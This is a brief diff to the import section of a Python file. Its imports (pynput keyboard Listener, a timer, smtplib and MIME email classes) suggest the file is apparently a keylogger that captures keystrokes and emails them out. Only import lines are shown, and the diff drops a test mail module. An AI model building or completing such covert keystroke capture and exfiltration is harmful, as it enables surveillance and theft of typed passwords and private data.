@@ -1,6 +1,5 @@
 import logging
 from threading import Timer
-from testSendMail import *
 from pynput.keyboard import Key, Listener
 import smtplib,ssl
 from email.mime.multipart import MIMEMultipart
